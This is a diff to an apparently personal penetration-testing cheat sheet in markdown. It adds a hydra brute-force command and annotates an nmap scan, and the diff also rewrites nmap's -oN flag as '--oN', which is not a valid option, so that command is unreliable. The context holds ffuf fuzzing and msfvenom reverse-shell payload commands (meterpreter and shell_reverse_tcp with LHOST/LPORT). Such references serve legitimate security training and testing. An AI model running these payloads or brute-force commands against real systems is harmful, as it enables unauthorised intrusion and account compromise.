@@ -22,8 +22,15 @@ ffuf -w <WORDLIST> -u http://<IP_ADDRESS>/FUZZ -o <OUTPUT_FILE> --recursion -fc 
 ```
 
 ### nmap (Basic network scanning)
+
+- Runs nmap default scripts
+- Scan service versions
+- Outputs file in normal format
+- Disable host discovery
+- Verbose
+
 ```
-nmap -sC -sV -oN <OUTPUT_FILE> -vv <IP_ADDRESS>
+nmap -sC -sV --oN <OUTPUT_FILE> -vv -Pn <IP_ADDRESS>
 ```
 
 ### msfvenom (Simple Windows Payload)
@@ -34,6 +41,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP_ADDRESS> LPORT=<
 ### msfvenom (Simple Windows Payload Shell)
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f py -b [bad characters]
+```
+
+### hydra (brute forcing)
+```
+hydra -l <USERNAME> -P <PASSWORD_LIST> <SERVICE>://<IP_ADDRESS>
 ```
 
 ### hydra (http-post-form)
